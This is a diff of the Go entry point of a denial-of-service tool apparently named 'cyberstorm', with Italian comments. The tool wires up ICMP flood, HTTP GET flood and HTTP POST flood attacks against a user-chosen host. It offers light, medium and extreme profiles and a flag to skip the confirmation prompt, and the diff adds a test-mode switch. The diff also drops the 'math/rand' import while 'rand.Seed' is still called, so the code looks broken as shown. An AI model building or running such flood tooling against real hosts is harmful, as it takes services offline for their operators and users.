@@ -12,7 +12,6 @@ import (
 	"sync"
 	"syscall"
 	"time"
-	"math/rand"
 
 	"cyberstorm/attacks"
 	"cyberstorm/core"
@@ -20,9 +19,6 @@ import (
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
-
-	// Stampa una frase casuale
-	core.PrintRandomPhrase()
 
 	// Definisci i flag CLI
 	host := flag.String("host", "", "destination IP or URL")
@@ -33,6 +29,7 @@ func main() {
 	duration := flag.Int("duration", 30, "duration of the attack in seconds (necessario solo per ICMP flood e altri)")
 	skipConfirmation := flag.Bool("skip-confirmation", false, "Skip confirmation prompt prima di iniziare l'attacco")
 	profile := flag.String("profile", "medium", "attack profile (light, medium, extreme)")
+	testMode := flag.Bool("test", false, "Enable test mode to send a limited number of packets")  // Aggiungi lo switch test
 	flag.Parse()
 
 	// Controlla che l'host sia specificato
@@ -45,7 +42,6 @@ func main() {
 	if *attack == "icmp-flood" {
 		fmt.Printf("Launching ICMP flood attack against %s for %d seconds.\n", *host, *duration)
 
-		// Chiedi conferma prima di lanciare l'attacco (se lo switch -skip-confirmation non è presente)
 		if !*skipConfirmation {
 			fmt.Printf("Are you sure you want to launch the ICMP flood attack against %s? (y/n): ", *host)
 			var confirmation string
@@ -80,8 +76,8 @@ func main() {
 			}
 		}
 
-		// Aggiungi il parametro duration alla chiamata a RunGoroutines
-		core.RunGoroutines(wg, ctx, *profile, attackFunc, *duration)
+		// Aggiungi il testMode alla chiamata a RunGoroutines
+		core.RunGoroutines(wg, ctx, *profile, attackFunc, *duration, *testMode)
 
 		log.Println("press ^C to stop")
 
@@ -159,18 +155,18 @@ func main() {
 		}
 	case "http-get-flood":
 		attackFunc = func() {
-			attacks.SendHTTPGet(*host, *port, *userAgent, wg, ctx) // Passa la porta
+			attacks.SendHTTPGet(*host, *port, *userAgent, wg, ctx)
 		}
 	case "http-post-flood":
 		attackFunc = func() {
-			attacks.SendHTTPPost(*host, *port, *body, *userAgent, wg, ctx) // Passa la porta
+			attacks.SendHTTPPost(*host, *port, *body, *userAgent, wg, ctx)
 		}
 	default:
 		log.Fatalf("Unsupported attack type: %s", *attack)
 	}
 
-	// Aggiungi il parametro duration alla chiamata a RunGoroutines
-	core.RunGoroutines(wg, ctx, *profile, attackFunc, *duration)
+	// Aggiungi il testMode alla chiamata a RunGoroutines
+	core.RunGoroutines(wg, ctx, *profile, attackFunc, *duration, *testMode)
 
 	log.Println("press ^C to stop")
 
